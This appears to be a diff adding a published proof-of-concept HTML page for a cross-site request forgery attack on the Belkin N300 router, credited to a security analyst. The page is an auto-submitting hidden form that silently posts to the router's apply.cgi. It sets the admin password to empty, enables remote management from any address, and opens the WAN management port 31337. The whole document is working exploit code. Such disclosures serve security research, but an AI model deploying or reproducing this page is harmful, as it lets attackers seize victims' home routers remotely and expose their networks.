@@ -1,0 +1,33 @@
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;title&gt;Belkin N300 CSRF - Change Admin Creds. and Enable Remote MGMT.&lt;/title&gt;
+&lt;!--*Discovered by: Jacob Holcomb 
+	- Security Analyst @ Independent Security Evaluators --&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;form name=&quot;belkinN300&quot; action=&quot;http://192.168.2.1/apply.cgi&quot; 
+	method=&quot;post&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;location_page&quot; value=&quot;system.stm&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;remote_mgmt_enabled&quot; value=&quot;1&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;http_passwd&quot; value=&quot;&quot;/&gt; 
+	&lt;!--Chaning password to null --&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;fw_disable&quot; value=&quot;0&quot;/&gt; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;EnableRgmt&quot; value=&quot;on&quot;/&gt; 
+	&lt;!-- Enable Remote Management --&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;allow_remote_ip&quot; value=&quot;0&quot;/&gt; 
+	&lt;!-- Setting session timeout --&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;http_wanport&quot; value=&quot;31337&quot;/&gt; 
+	&lt;!-- Set the Remote Management Port --&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;arc_action&quot; value=&quot;Apply+Changes&quot;/&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+function BeLkIn300() {document.belkinN300.submit();};
+window.setTimeout(BeLkIn300, 0000);
+&lt;/script&gt;
+
+&lt;body&gt;
+&lt;/html&gt;
